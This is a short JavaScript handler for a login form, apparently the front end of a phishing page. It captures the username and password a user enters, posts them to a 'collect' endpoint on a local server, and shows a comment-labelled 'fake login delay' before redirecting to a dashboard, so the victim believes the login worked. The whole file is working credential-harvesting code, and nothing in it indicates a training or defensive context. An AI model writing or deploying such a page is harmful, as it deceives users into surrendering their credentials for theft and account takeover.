document.getElementById('loginForm').addEventListener('submit', async function (e) {
    e.preventDefault();
  
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
  
    const spinner = document.createElement('div');
    spinner.className = 'loader';
    document.querySelector('.login-box').appendChild(spinner);
  
    const res = await fetch('http://localhost:5000/collect', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });
  
    setTimeout(() => {
      window.location.href = 'dashboard.html';
    }, 2000); // 2-second fake login delay
  });
  